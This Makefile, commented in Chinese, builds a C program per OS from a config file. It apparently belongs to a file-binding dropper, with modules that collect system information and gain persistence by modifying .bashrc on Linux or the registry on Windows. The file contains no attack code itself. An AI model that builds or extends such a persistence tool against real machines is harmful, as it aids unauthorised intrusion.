CC = gcc
CFLAGS = -Wall -I.

# 默认目标
all: main

# 运行脚本以生成C文件
src/bind_files.h src/bind_files.c:
	./bind.sh

# 固定配置文件路径
CONF_FILE = config/current_config.conf

# 读取配置文件
-include $(CONF_FILE)

# 根据配置文件设置源文件和编译选项
ifeq ($(OS),linux)
    SOURCES = src/main.c src/system_info.c src/linux_persistence_bashrc.c src/release_bind_files.c src/bind_files.c
    ifeq ($(FEATURE_BASHRC_MOD),1)
        CFLAGS += -DBASHRC_MOD
    endif
endif

ifeq ($(OS),windows)
    SOURCES = src/main.c src/system_info.c src/release_bind_files.c src/bind_files.c
    ifeq ($(FEATURE_REGISTRY_MOD),1)
        SOURCES += src/windows_persistence_registry.c
        CFLAGS += -DREGISTRY_MOD
    endif
endif

ifeq ($(OS),mac)
    SOURCES = src/main.c src/system_info.c src/release_bind_files.c src/bind_files.c
    # 根据mac系统添加特定的功能代码
endif

# 确保 SOURCES 不为空
SOURCES := $(filter-out ,$(SOURCES))

# 编译项目
main: $(SOURCES:.c=.o)
	$(CC) -o main $(SOURCES:.c=.o)

%.o: %.c
	$(CC) $(CFLAGS) -c $< -o $@

# 清理目标
clean:
	rm -f main *.o src/bind_files.h src/bind_files.c

# PHONY目标
.PHONY: all clean
